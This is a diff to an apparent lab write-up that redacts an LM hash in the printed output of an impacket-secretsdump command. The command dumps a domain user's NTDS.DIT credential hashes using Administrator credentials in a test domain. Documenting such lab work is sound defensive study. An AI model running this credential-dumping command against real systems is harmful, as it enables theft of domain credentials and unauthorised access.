@@ -157,7 +157,7 @@ impacket-secretsdump -just-dc-user spray-user03 soclab.local/Administrator:'[RED
 ```text
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-soclab.local\spray-user03:1148:aad3b435b51404eeaad3b435b51404ee:[REDACTED_NTLM_HASH]:::
+soclab.local\spray-user03:1148:[REDACTED_LM_HASH]:[REDACTED_NTLM_HASH]:::
 ```
 
 ![05 Kali Secretsdump NTDS Extraction](images/05_kali_secretsdump_ntds_extraction_hash_harvest_redacted.png)
